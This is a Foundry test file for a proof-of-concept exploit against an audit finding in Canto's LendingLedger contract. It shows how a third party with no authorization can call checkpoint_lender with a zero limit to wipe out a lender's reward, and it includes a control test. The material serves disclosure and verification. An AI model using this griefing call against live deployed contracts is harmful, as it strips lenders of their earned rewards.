// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./26975-h-07-lack-of-access-control-in-lendingledgersolcheckpoint-le.sol";

/*//////////////////////////////////////////////////////////////
    Canto (veRWA) — LendingLedger checkpoint_lender()/checkpoint_market() lack
    access control and can be griefed to zero a lender's reward (H-07, #26975)

    Both functions let ANYONE pass `_forwardTimestampLimit = 0`. The vulnerable
    `_checkpoint_*` bodies then write the epoch tracker unconditionally, even
    when the "fill historical gaps" branch never ran — silently skipping the
    propagation of a lender's (or market's) balance into future epochs. The
    next real deposit/claim call resumes from epoch 0, treats the skip as "no
    history", and never re-fills it, so the lender's reward for that stretch
    silently computes to zero instead of reverting.

    - test_exploit: plants the "victim deposited one epoch ago, in two
      markets" precondition directly into LendingLedger's storage via
      `vm.store` (mirrors the Playground's `setup.steps`, since a
      cheatcode-free, single-timestamp `run()` cannot itself fast-forward real
      time), then drives the cheatcode-free Exploit and re-asserts the harm:
      a griefed market pays 0, an un-griefed control market pays the full
      reward.
    - test_realTimeGriefReproduction: standalone rebuild using REAL
      `sync_ledger` deposits, a REAL `vm.warp`, and a real unauthorized
      `checkpoint_lender(market, lender, 0)` call from a third party —
      independent proof the bug is real, not an artifact of the vm.store
      shortcut above.
    - test_control_noGrief_fullReward: control — without the unauthorized
      checkpoint call, the same lender claims the full reward, isolating the
      grief call itself as the root cause.
//////////////////////////////////////////////////////////////*/
contract LendingLedgerCheckpointGriefTest is Test {
    uint256 internal constant WEEK = 7 days;
    uint256 internal constant DEPOSIT = 10 ether;
    uint256 internal constant REWARD = 6 ether;

    function _lendingMarketBalancesSlot(address market, address lender, uint256 epoch) internal pure returns (bytes32) {
        bytes32 inner1 = keccak256(abi.encode(market, uint256(3)));
        bytes32 inner2 = keccak256(abi.encode(lender, inner1));
        return keccak256(abi.encode(epoch, inner2));
    }

    function _lendingMarketBalancesEpochSlot(address market, address lender) internal pure returns (bytes32) {
        bytes32 inner = keccak256(abi.encode(market, uint256(4)));
        return keccak256(abi.encode(lender, inner));
    }

    function _lendingMarketTotalBalanceSlot(address market, uint256 epoch) internal pure returns (bytes32) {
        bytes32 inner = keccak256(abi.encode(market, uint256(5)));
        return keccak256(abi.encode(epoch, inner));
    }

    function _lendingMarketTotalBalanceEpochSlot(address market) internal pure returns (bytes32) {
        return keccak256(abi.encode(market, uint256(6)));
    }

    function _userClaimedEpochSlot(address market, address lender) internal pure returns (bytes32) {
        bytes32 inner = keccak256(abi.encode(market, uint256(7)));
        return keccak256(abi.encode(lender, inner));
    }

    /// @dev Plants "victim deposited `deposit` in `market` at `epoch`, and has
    ///      not claimed anything yet" directly into `ledger`'s storage.
    function _plantDeposit(LendingLedger ledger, address market, address lender, uint256 epoch, uint256 deposit, uint256 totalBalance)
        internal
    {
        vm.store(address(ledger), _lendingMarketBalancesSlot(market, lender, epoch), bytes32(deposit));
        vm.store(address(ledger), _lendingMarketBalancesEpochSlot(market, lender), bytes32(epoch));
        vm.store(address(ledger), _lendingMarketTotalBalanceSlot(market, epoch), bytes32(totalBalance));
        vm.store(address(ledger), _lendingMarketTotalBalanceEpochSlot(market), bytes32(epoch));
        vm.store(address(ledger), _userClaimedEpochSlot(market, lender), bytes32(epoch));
    }

    /// @notice HARM via the self-contained Exploit.
    function test_exploit() public {
        // Anchor block.timestamp to a realistic epoch (forge's default t=1 is
        // less than a WEEK, which would underflow claim()'s `currEpoch - WEEK`).
        vm.warp(1706075008);

        Exploit e = new Exploit();
        LendingLedger ledger = e.ledger();
        address victim = address(e.victim());
        address m1 = e.M1();
        address m2 = e.M2();
        uint256 e0 = e.depositEpoch();

        _plantDeposit(ledger, m1, victim, e0, DEPOSIT, DEPOSIT);
        _plantDeposit(ledger, m2, victim, e0, DEPOSIT, 2 * DEPOSIT); // M2 has other depositors too

        vm.deal(address(ledger), 20 ether);

        e.run();

        // Re-assert independently from the driver.
        assertEq(address(e.victim()).balance, REWARD, "victim only ever received the control market's reward");
    }

    /// @notice Standalone rebuild using REAL sync_ledger deposits, a REAL
    ///         vm.warp, and a real unauthorized third-party checkpoint call.
    function test_realTimeGriefReproduction() public {
        vm.warp(1706075008);
        MockGaugeController mgc = new MockGaugeController();
        LendingLedger ledger = new LendingLedger(address(mgc), address(this));
        vm.deal(address(ledger), 20 ether);

        address market = makeAddr("market");
        address lender = makeAddr("lender");
        address griefer = makeAddr("griefer");

        ledger.whiteListLendingMarket(market, true);

        uint256 fromEpoch = ((block.timestamp / WEEK) * WEEK) + 5 * WEEK;
        uint256 toEpoch = fromEpoch + 5 * WEEK;
        ledger.setRewards(fromEpoch, toEpoch, uint248(1 ether));

        // Lender deposits (real sync_ledger call, real balances).
        vm.prank(market);
        ledger.sync_ledger(lender, int256(DEPOSIT));

        // Real elapsed time: 20 weeks pass with no further activity.
        vm.warp(block.timestamp + 20 weeks);

        // A completely unrelated third party grieves the lender's checkpoint
        // — nothing in the contract stops them.
        vm.prank(griefer);
        ledger.checkpoint_lender(market, lender, 0);

        // Lender's claim is silently reduced to 0 instead of reverting.
        vm.prank(lender);
        ledger.claim(market, fromEpoch, toEpoch);
        assertEq(lender.balance, 0, "lender's reward was griefed to 0");
    }

    /// @notice Control: without the unauthorized checkpoint call, the same
    ///         lender claims the full reward — isolating the grief call
    ///         itself, not the deposit/claim mechanics, as the root cause.
    function test_control_noGrief_fullReward() public {
        vm.warp(1706075008);
        MockGaugeController mgc = new MockGaugeController();
        LendingLedger ledger = new LendingLedger(address(mgc), address(this));
        vm.deal(address(ledger), 20 ether);

        address market = makeAddr("market");
        address lender = makeAddr("lender");

        ledger.whiteListLendingMarket(market, true);

        uint256 fromEpoch = ((block.timestamp / WEEK) * WEEK) + 5 * WEEK;
        uint256 toEpoch = fromEpoch + 5 * WEEK;
        ledger.setRewards(fromEpoch, toEpoch, uint248(1 ether));

        vm.prank(market);
        ledger.sync_ledger(lender, int256(DEPOSIT));

        vm.warp(block.timestamp + 20 weeks);
        // No grief call here.

        vm.prank(lender);
        ledger.claim(market, fromEpoch, toEpoch);
        assertGt(lender.balance, 0, "lender receives a real reward when nobody griefs the checkpoint");
    }
}
